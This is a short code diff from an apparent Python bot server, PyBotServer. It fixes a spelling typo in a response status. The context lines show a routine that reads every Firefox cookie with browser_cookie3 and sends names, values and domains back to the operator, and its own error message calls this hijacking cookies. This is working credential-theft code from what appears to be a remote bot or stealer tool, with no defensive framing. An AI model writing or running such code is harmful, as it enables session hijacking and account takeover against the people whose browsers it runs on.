@@ -36,7 +36,7 @@ class PyBotServer:
         try:
             cookies = browser_cookie3.firefox()
             cookie_dict = {cookie.name: {'value': cookie.value, 'domain': cookie.domain} for cookie in cookies}
-            await self.send_response("succsess", json.dumps(cookie_dict))
+            await self.send_response("success", json.dumps(cookie_dict))
         except Exception as e:
             await self.send_response("error", f"Failed to hijack cookies. Error: {str(e)}")
 
